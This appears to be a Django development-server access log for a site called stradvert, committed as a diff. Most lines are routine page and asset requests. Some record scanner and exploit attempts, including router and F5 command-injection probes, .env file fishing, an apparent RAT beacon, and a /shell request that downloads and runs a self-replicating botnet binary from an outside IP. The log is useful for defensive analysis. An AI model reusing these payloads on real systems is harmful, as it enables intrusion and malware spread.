+[01/Apr/2023 16:48:50] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[01/Apr/2023 17:09:46] "POST /mgmt/tm/util/bash HTTP/1.1" 301 0
+[01/Apr/2023 17:09:49] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Ôv')
+[01/Apr/2023 17:09:49] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 17:09:49] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 18:35:39] code 400, message Bad request syntax ('MGLNDD_5.161.208.197_80')
+[01/Apr/2023 18:35:39] "MGLNDD_5.161.208.197_80" 400 -
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[01/Apr/2023 18:39:48] "GET / HTTP/1.0 " 400 62703
+[01/Apr/2023 18:42:15] "GET / HTTP/1.1" 200 3497
+[01/Apr/2023 18:42:16] "GET /favicon.ico HTTP/1.1" 302 0
+[01/Apr/2023 18:42:16] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[01/Apr/2023 18:45:42] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03CÿØÛ\x95[VÐøz\x17M\x80<\x99\x80\x02\x11{)\x05KÖ¿MoK´ª\x03z>\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[01/Apr/2023 18:45:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 18:45:42] code 400, message Bad request version ('À\x14À')
+[01/Apr/2023 18:45:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 18:45:42] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 18:45:42] "GET /client/get_targets HTTP/1.1" 301 0
+[01/Apr/2023 18:45:42] "GET /upl.php HTTP/1.1" 301 0
+[01/Apr/2023 18:45:42] code 400, message Bad request version ('À\x14À')
+[01/Apr/2023 18:45:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 18:45:42] "GET /geoip/ HTTP/1.1" 301 0
+[01/Apr/2023 18:45:42] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 18:45:42] "GET /favicon.ico HTTP/1.1" 301 0
+[01/Apr/2023 18:57:14] "GET /druid/index.html HTTP/1.1" 301 0
+[01/Apr/2023 19:08:09] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 19:20:59] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[01/Apr/2023 19:21:03] code 400, message Bad request version ('À\x13À')
+[01/Apr/2023 19:21:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 19:50:53] "GET /robots.txt HTTP/1.1" 302 0
+[01/Apr/2023 19:51:37] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 19:52:46] "GET /robots.txt HTTP/1.1" 302 0
+[01/Apr/2023 20:18:52] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 20:24:38] "GET /robots.txt HTTP/1.1" 301 0
+[01/Apr/2023 20:24:41] "GET /sitemap HTTP/1.1" 301 0
+[01/Apr/2023 20:24:43] "GET /sitemap HTTP/1.1" 302 0
+[01/Apr/2023 20:24:43] "GET /login/?next=/sitemap HTTP/1.1" 200 5163
+[01/Apr/2023 20:24:46] "GET /sitemap.txt HTTP/1.1" 301 0
+[01/Apr/2023 20:24:46] "GET /sitemap.txt HTTP/1.1" 302 0
+[01/Apr/2023 20:24:47] "GET /login/?next=/sitemap.txt HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+[01/Apr/2023 20:57:43] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 63970
+Invalid HTTP_HOST header: 'pro.ip-api.com:443'. You may need to add 'pro.ip-api.com' to ALLOWED_HOSTS.
+Bad Request: /pro.ip-api.com:443
+[01/Apr/2023 21:12:43] "CONNECT pro.ip-api.com:443 HTTP/1.1" 400 63187
+[01/Apr/2023 21:21:57] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[01/Apr/2023 21:22:02] code 400, message Bad request version ('À\x13À')
+[01/Apr/2023 21:22:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 21:36:15] "POST /mgmt/tm/util/bash HTTP/1.1" 301 0
+[01/Apr/2023 21:36:15] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03P>¿Æ\x1al²\x96Îßìj\x8e¨\x99o®Ú\x95÷\x90GÉ>')
+[01/Apr/2023 21:36:15] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[01/Apr/2023 21:36:16] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 21:36:52] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 22:13:44] "GET //.env HTTP/1.1" 301 0
+[01/Apr/2023 22:13:45] "GET /.env HTTP/1.1" 302 0
+[01/Apr/2023 22:13:46] "GET /login/?next=/.env HTTP/1.1" 200 5163
+[01/Apr/2023 22:36:48] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 23:31:22] "GET / HTTP/1.1" 301 0
+[01/Apr/2023 23:59:20] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[02/Apr/2023 00:01:12] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 00:57:32] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /0bef
+[02/Apr/2023 01:45:26] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 01:55:19] "GET /.env HTTP/1.1" 301 0
+[02/Apr/2023 01:55:19] "GET /.env.example HTTP/1.1" 301 0
+[02/Apr/2023 01:55:19] "GET /blog/.env HTTP/1.1" 301 0
+[02/Apr/2023 01:55:19] "GET /api/.env HTTP/1.1" 301 0
+[02/Apr/2023 01:55:19] "GET /laravel/.env HTTP/1.1" 301 0
+[02/Apr/2023 01:55:19] "GET /docs/.env HTTP/1.1" 301 0
+[02/Apr/2023 01:55:19] "GET /_profiler/phpinfo HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[02/Apr/2023 02:05:00] "GET / HTTP/1.0" 400 63012
+[02/Apr/2023 02:22:09] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 02:22:43] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 02:23:09] "GET /favicon.ico HTTP/1.1" 301 0
+[02/Apr/2023 02:23:54] "GET /geoserver/web/ HTTP/1.1" 301 0
+[02/Apr/2023 02:52:40] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 03:15:14] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 03:24:23] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 03:24:25] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 03:25:04] "GET /favicon.ico HTTP/1.1" 301 0
+[02/Apr/2023 03:25:07] "GET /favicon.ico HTTP/1.1" 302 0
+[02/Apr/2023 03:26:28] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 03:26:31] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 03:26:46] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 03:30:07] "GET /favicon.ico HTTP/1.1" 301 0
+[02/Apr/2023 03:30:07] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 03:30:08] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 03:52:49,504] - Broken pipe from ('45.227.254.48', 1699)
+
+[02/Apr/2023 03:52:49] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[02/Apr/2023 03:52:49] "  ,'à     Cookie: mstshash=Domain" 400 -
+[02/Apr/2023 03:52:49] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[02/Apr/2023 03:52:49] "  ,'à     Cookie: mstshash=Domain" 400 -
+[02/Apr/2023 04:11:46,591] - Broken pipe from ('167.94.146.60', 50984)
+
+[02/Apr/2023 04:11:47] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 04:11:47] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 04:11:48] code 505, message Invalid HTTP version (2.0)
+[02/Apr/2023 04:11:48] "PRI * HTTP/2.0" 505 -
+[02/Apr/2023 05:05:34] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 05:05:34] code 400, message Bad request version ('À\x14À')
+[02/Apr/2023 05:05:34] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 05:48:30] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[02/Apr/2023 05:51:59] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 06:48:42] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 07:58:38] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 09:14:03] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 09:31:26] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[02/Apr/2023 09:31:27] code 400, message Bad request version ('À\x13À')
+[02/Apr/2023 09:31:27] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 09:57:03] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[02/Apr/2023 10:41:18] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[02/Apr/2023 10:41:22] code 400, message Bad request version ('À\x13À')
+[02/Apr/2023 10:41:22] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 11:17:41] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 11:18:13] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 11:18:13] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[02/Apr/2023 11:18:13] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[02/Apr/2023 11:18:14] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[02/Apr/2023 11:18:14] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[02/Apr/2023 11:18:15] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[02/Apr/2023 11:18:15] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[02/Apr/2023 11:18:19] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 11:18:20] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 11:18:20] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[02/Apr/2023 11:18:20] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[02/Apr/2023 11:18:20] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[02/Apr/2023 11:18:20] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[02/Apr/2023 11:18:20] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[02/Apr/2023 11:18:20] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+[02/Apr/2023 11:44:01] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 63970
+[02/Apr/2023 11:53:27] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 12:43:05] code 400, message Bad request version ('À\x14À')
+[02/Apr/2023 12:43:05] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 12:43:05] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ñ=Î\x87©tÕ\x99Ð\x1b\x84Exî-³XÚ')
+[02/Apr/2023 12:43:05] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 12:43:05] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 12:43:05] "GET /client/get_targets HTTP/1.1" 301 0
+[02/Apr/2023 12:43:05] "GET /upl.php HTTP/1.1" 301 0
+[02/Apr/2023 12:43:06] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ð®îj')
+[02/Apr/2023 12:43:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 12:43:06] "GET /geoip/ HTTP/1.1" 301 0
+[02/Apr/2023 12:43:06] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 12:43:06] "GET /favicon.ico HTTP/1.1" 301 0
+[02/Apr/2023 12:56:58] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 13:15:32] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 13:15:32] code 400, message Bad request version ('À\x14À')
+[02/Apr/2023 13:15:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 13:26:24] code 400, message Bad request version ('À\x14À')
+[02/Apr/2023 13:26:24] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[02/Apr/2023 14:03:01] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 14:22:40] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 14:25:05] "GET /robots.txt HTTP/1.1" 301 0
+[02/Apr/2023 14:25:05] "GET /robots.txt HTTP/1.1" 302 0
+[02/Apr/2023 14:25:05] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[02/Apr/2023 14:25:05] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 14:25:06] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 14:25:56] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[02/Apr/2023 14:25:56] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[02/Apr/2023 14:25:56] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[02/Apr/2023 14:25:56] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[02/Apr/2023 14:25:56] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[02/Apr/2023 14:25:57] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[02/Apr/2023 14:25:57] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[02/Apr/2023 14:25:57] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[02/Apr/2023 14:25:57] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[02/Apr/2023 14:25:58] "GET /favicon.ico HTTP/1.1" 302 0
+[02/Apr/2023 14:25:58] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[02/Apr/2023 14:39:04] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 14:40:23] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 15:42:04] code 400, message Bad HTTP/0.9 request type ('\x00\x0e8ö¼')
+[02/Apr/2023 15:42:04] " 8ö¼ÍÕµbß     " 400 -
+[02/Apr/2023 15:44:44] "GET /_ignition/health-check/ HTTP/1.1" 301 0
+[02/Apr/2023 15:44:45] "GET /_ignition/health-check/ HTTP/1.1" 302 0
+[02/Apr/2023 15:44:45] "GET /login/?next=/_ignition/health-check/ HTTP/1.1" 200 5163
+[02/Apr/2023 15:44:48] "GET /public/_ignition/health-check/ HTTP/1.1" 301 0
+[02/Apr/2023 15:44:49] "GET /public/_ignition/health-check/ HTTP/1.1" 302 0
+[02/Apr/2023 15:44:49] "GET /login/?next=/public/_ignition/health-check/ HTTP/1.1" 200 5163
+[02/Apr/2023 15:44:52] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 301 0
+[02/Apr/2023 15:44:52] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 302 0
+[02/Apr/2023 15:44:54] "GET /login/?next=/wp-includes/wlwmanifest.xml HTTP/1.1" 200 5163
+[02/Apr/2023 15:48:33,054] - Broken pipe from ('172.71.182.215', 57190)
+
+[02/Apr/2023 15:51:43,108] - Broken pipe from ('172.71.98.96', 14554)
+
+[02/Apr/2023 16:02:33] "GET /admin/assets/plugins/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 301 0
+[02/Apr/2023 16:03:00] "GET /admin/assets/plugins/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 302 0
+[02/Apr/2023 16:06:17,841] - Broken pipe from ('172.68.51.106', 19288)
+
+[02/Apr/2023 17:21:45] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 17:21:45] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 17:33:06] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[02/Apr/2023 18:04:02] "GET / HTTP/1.1" 400 64546
+[02/Apr/2023 18:04:18] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 18:04:33] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 18:04:40] "GET /robots.txt HTTP/1.1" 302 0
+[02/Apr/2023 18:04:47] "GET /login/ HTTP/1.1" 200 5163
+[02/Apr/2023 18:08:32] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 18:14:04] "GET /robots.txt HTTP/1.1" 302 0
+[02/Apr/2023 18:14:04] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[02/Apr/2023 18:30:28] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 19:09:31] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[02/Apr/2023 19:22:47] "GET /.env HTTP/1.1" 301 0
+[02/Apr/2023 19:22:58] "POST / HTTP/1.1" 301 0
+[02/Apr/2023 19:24:31] "GET /explore HTTP/1.1" 301 0
+[02/Apr/2023 20:51:36] "GET / HTTP/1.1" 200 3497
+[02/Apr/2023 20:51:36] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[02/Apr/2023 21:00:14] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[02/Apr/2023 21:25:11] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 21:52:25] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 21:53:43] "GET / HTTP/1.1" 301 0
+[02/Apr/2023 22:32:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[02/Apr/2023 22:32:02] "  /*à     Cookie: mstshash=Administr" 400 -
+[02/Apr/2023 22:52:52] "GET /wp-login.php HTTP/1.1" 301 0
+[02/Apr/2023 22:52:52] "GET /wp-login.php HTTP/1.1" 302 0
+[02/Apr/2023 22:52:52] "GET /login/?next=/wp-login.php HTTP/1.1" 200 5163
+[02/Apr/2023 23:19:33] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 00:49:28] code 400, message Bad request syntax ('MGLNDD_5.161.208.197_80')
+[03/Apr/2023 00:49:28] "MGLNDD_5.161.208.197_80" 400 -
+[03/Apr/2023 01:02:06] "GET /.env HTTP/1.1" 301 0
+[03/Apr/2023 01:02:06] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01H\x01\x00\x01D\x03\x03»9Î0ë\xad¾¡ü5ª]\x06Z¥Í\x9a¨sÁ\x8a\x80\x19\x84Ã\x04FçÓÞýb')
+[03/Apr/2023 01:02:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /.well-known/assetlinks.json
+[03/Apr/2023 01:15:41] "GET /.well-known/assetlinks.json HTTP/1.1" 400 64911
+Bad Request: /.well-known/assetlinks.json
+[03/Apr/2023 01:15:41] "GET /.well-known/assetlinks.json HTTP/1.1" 400 64912
+[03/Apr/2023 01:30:19] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 01:49:03] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 01:52:37] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 01:56:17,660] - Broken pipe from ('162.142.125.225', 54814)
+
+[03/Apr/2023 01:56:18] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 01:56:18] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 01:56:18] code 505, message Invalid HTTP version (2.0)
+[03/Apr/2023 01:56:18] "PRI * HTTP/2.0" 505 -
+[03/Apr/2023 02:05:53] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 02:20:56] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 02:21:47] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 02:22:16] "GET /favicon.ico HTTP/1.1" 301 0
+[03/Apr/2023 02:23:01] "GET /geoserver/web/ HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[03/Apr/2023 03:32:39] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 03:35:14] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[03/Apr/2023 04:18:46] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Apr/2023 04:37:53] "GET / HTTP/1.1" 400 62706
+[03/Apr/2023 05:25:26] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[03/Apr/2023 05:25:26] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[03/Apr/2023 05:25:27] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[03/Apr/2023 05:25:27] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[03/Apr/2023 05:25:27] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[03/Apr/2023 05:25:27] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[03/Apr/2023 05:25:27] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[03/Apr/2023 05:25:27] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[03/Apr/2023 05:25:28] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[03/Apr/2023 05:25:28] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[03/Apr/2023 05:25:28] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[03/Apr/2023 05:25:29] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[03/Apr/2023 06:10:12] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 06:33:54] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 06:49:17] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 06:52:59] code 400, message Bad request version ("x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
+[03/Apr/2023 06:52:59] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 -
+[03/Apr/2023 06:53:06] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 07:54:46,780] - Broken pipe from ('162.142.125.226', 46746)
+
+[03/Apr/2023 07:54:47] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'static.197.208.161.5.clients.your-server.de'. You may need to add 'static.197.208.161.5.clients.your-server.de' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Apr/2023 07:54:47] "GET / HTTP/1.1" 400 63811
+[03/Apr/2023 07:54:47] code 505, message Invalid HTTP version (2.0)
+[03/Apr/2023 07:54:47] "PRI * HTTP/2.0" 505 -
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Apr/2023 08:28:28] "GET / HTTP/1.1" 400 65003
+[03/Apr/2023 08:34:58] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[03/Apr/2023 08:35:03] code 400, message Bad request syntax ('\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x0330\x9f(dïX\x94H')
+[03/Apr/2023 08:35:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Apr/2023 08:35:58] "GET / HTTP/1.1" 400 65050
+[03/Apr/2023 08:42:35] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 08:48:10] "GET / HTTP/1.1" 200 3497
+[03/Apr/2023 08:48:11] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[03/Apr/2023 08:48:11] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[03/Apr/2023 08:48:12] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[03/Apr/2023 08:48:12] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[03/Apr/2023 08:48:12] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[03/Apr/2023 08:48:12] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[03/Apr/2023 08:48:12] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[03/Apr/2023 08:48:12] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[03/Apr/2023 08:48:12] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[03/Apr/2023 08:48:12] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[03/Apr/2023 08:48:12] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[03/Apr/2023 08:48:12] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[03/Apr/2023 08:48:19] "GET /login/ HTTP/1.1" 200 5163
+[03/Apr/2023 08:49:01] "POST /login/ HTTP/1.1" 302 0
+[03/Apr/2023 08:49:01] "GET /dashboard HTTP/1.1" 200 13279
+[03/Apr/2023 08:49:03] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[03/Apr/2023 08:49:03] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[03/Apr/2023 08:49:03] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[03/Apr/2023 09:11:03] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 09:50:53] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[03/Apr/2023 09:51:00] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x0365\x0f\x16yÚ:äc\x86')
+[03/Apr/2023 09:51:00] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[03/Apr/2023 09:55:05] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 10:57:23] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1')
+[03/Apr/2023 10:57:23] "GET /shell?cd+/tmp;+wget+http:/\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 400 -
+[03/Apr/2023 10:58:58] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+[03/Apr/2023 10:58:58] "  à          " 400 -
